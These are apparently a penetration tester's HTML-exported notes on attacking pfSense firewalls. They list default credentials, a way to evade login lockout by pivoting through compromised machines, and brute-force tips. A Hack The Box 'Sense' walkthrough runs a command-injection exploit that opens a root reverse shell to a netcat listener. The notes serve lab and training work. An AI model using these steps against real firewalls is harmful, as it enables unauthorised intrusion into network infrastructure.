<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>pfSense</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># pfSense</h1></strong><br />pfSense is an open source firewall and router distribution based on FreeBSD.<br /><br /><a href=""><img src="images/269-1.png" alt="images/269-1.png" /></a><br /><br /><strong><h2>## Tips</h2></strong><br />• Default credentials are <code>admin / pfsense</code><br />• Usernames (in my experience) only work if lowercase<br />• Login is (most likely) only available available over HTTPS<br />• The default setup is configured to lock you out for 24 hours after 15 failed login attempts - so it&#39;s not often worth brute-forcing<br />   ◇ If you get logged out, try accessing the box from another host<br />   ◇ If you&#39;re on a network where you&#39;ve already pwned other systems, ssh port forward your traffic through one of those pwned machines so that you can continue pentesting pfsense despite being locked out - <a href="https://youtu.be/d2nVDoVr0jE?t=449">https://youtu.be/d2nVDoVr0jE?t=449</a><br /><br />• <code>/changelog.txt</code> might tell you something interesting<br />• Directory bruteforce for <code>.php</code>, and <code>.txt</code> extensions<br /><br /><strong><h2>## Exploits</h2></strong><br />There are lots of cross-site request forgery exploits, <br />as well as lots of authenticated command injection exploits.<br /><br />Here&#39;s a good set of blog posts on pfSense vulnerabilities:<br /><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-1-xss/">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-1-xss/</a><br /><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</a><br /><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/</a><br /><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/</a><br /><br /><strong><h3>### pfSense &lt; 2.1.4 - &#39;status_rrd_graph_img.php&#39; Command Injection</h3></strong><br /><a href="https://www.exploit-db.com/exploits/43560">https://www.exploit-db.com/exploits/43560</a><br /><br /><strong>#### Example from hackthebox Sense</strong><br />Start a listener on your attacking machine to receive the reverse shell<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/sense#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />Run the exploit.<br />Details on how to run it are included in the script.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/sense/443#&nbsp;python3&nbsp;cmdinjection.py&nbsp;--rhost&nbsp;10.10.10.60&nbsp;--lhost&nbsp;10.10.14.12&nbsp;--lport&nbsp;9001&nbsp;--username&nbsp;rohit&nbsp;--password&nbsp;pfsense<br />CSRF&nbsp;token&nbsp;obtained<br />Running&nbsp;exploit...<br />Exploit&nbsp;completed</div></div><br /><br />You should receive a shell on your listener :)<br /><div class="codebox"><div class="codebox">[...]<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br />connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.60]&nbsp;33493<br />sh:&nbsp;cant&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br />#&nbsp;id<br />uid=0(root)&nbsp;gid=0(wheel)&nbsp;groups=0(wheel)<br />#&nbsp;ls&nbsp;-l&nbsp;/home<br />total&nbsp;8<br />drwxrwxr-x&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;operator&nbsp;&nbsp;512&nbsp;Oct&nbsp;14&nbsp;&nbsp;2017&nbsp;.snap<br />drwxr-xr-x&nbsp;&nbsp;2&nbsp;rohit&nbsp;&nbsp;nobody&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Oct&nbsp;14&nbsp;&nbsp;2017&nbsp;rohit</div></div><br /></div>
</body>
</html>
